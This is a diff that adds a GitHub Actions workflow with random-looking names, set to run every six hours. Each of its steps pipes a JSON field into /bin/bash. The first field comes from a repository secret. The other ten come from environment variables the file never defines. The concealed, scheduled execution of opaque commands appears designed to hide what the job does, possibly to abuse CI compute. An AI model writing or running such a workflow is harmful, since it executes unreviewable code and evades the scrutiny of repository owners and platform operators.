@@ -1,0 +1,28 @@
+name: tairuili6715
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '47 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: tairuili6715
+        env:
+          xdnj11503: ${{ secrets.xdnj11503 }}
+        run: |
+          echo $xdnj11503 | jq -r .h035 | /bin/bash
+          echo $yb97 | jq -r .lwj16372 | /bin/bash
+          echo $m28 | jq -r .mbh00 | /bin/bash
+          echo $jncl50780 | jq -r .xesql15 | /bin/bash
+          echo $xmn556 | jq -r .zpi016 | /bin/bash
+          echo $vs3938 | jq -r .rpqwv718 | /bin/bash
+          echo $jeg3 | jq -r .zmupa6083 | /bin/bash
+          echo $vxw2421 | jq -r .anzt94951 | /bin/bash
+          echo $c44611 | jq -r .ym3830 | /bin/bash
+          echo $g7653 | jq -r .k65 | /bin/bash
+          echo $lj453 | jq -r .ivn6615 | /bin/bash
+
